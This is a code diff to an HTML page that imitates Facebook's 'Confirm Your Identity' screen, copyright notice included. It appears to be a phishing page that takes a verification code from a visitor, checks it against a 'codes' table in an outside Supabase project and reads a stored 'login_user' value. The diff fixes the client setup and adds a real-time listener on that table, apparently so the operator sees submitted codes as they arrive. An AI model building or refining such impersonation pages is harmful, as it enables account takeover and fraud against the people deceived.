@@ -4,7 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Facebook – Confirm Your Identity</title>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
   <style>
     body {
       background-color: #f0f2f5;
@@ -120,11 +119,13 @@
     <div class="bottom-line">&copy; 2025 Meta Platforms, Inc.</div>
   </div>
 
+  <!-- Include Supabase JS Library -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
   <script>
-    // Supabase credentials
     const SUPABASE_URL = 'https://scserlwosxrmnvomipxt.supabase.co';
-    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'; // paste full anon key here
-    const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    const SUPABASE_ANON_KEY = 'your-full-anon-key-here'; // Replace this with your actual anon key
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
     window.onload = function () {
       const user = localStorage.getItem("login_user");
@@ -165,7 +166,6 @@
 
       if (!code) {
         codeInput.style.borderColor = "red";
-
         const error = document.createElement("div");
         error.className = "error-message";
         error.textContent = "Required";
@@ -174,12 +174,11 @@
         error.style.marginTop = "-15px";
         error.style.marginBottom = "15px";
         codeInput.parentNode.insertBefore(error, codeInput.nextSibling);
-
         return;
       }
 
       try {
-        const { data, error } = await supabase
+        const { data, error } = await supabaseClient
           .from("codes")
           .select("*")
           .eq("code", code)
@@ -196,6 +195,19 @@
         alert("An error occurred. Please try again.");
       }
     }
+
+    // ✅ Real-time listener for changes to the "codes" table
+    supabaseClient
+      .channel("realtime-codes")
+      .on(
+        "postgres_changes",
+        { event: "*", schema: "public", table: "codes" },
+        payload => {
+          console.log("Real-time update received:", payload);
+        }
+      )
+      .subscribe();
+
   </script>
 </body>
 </html>
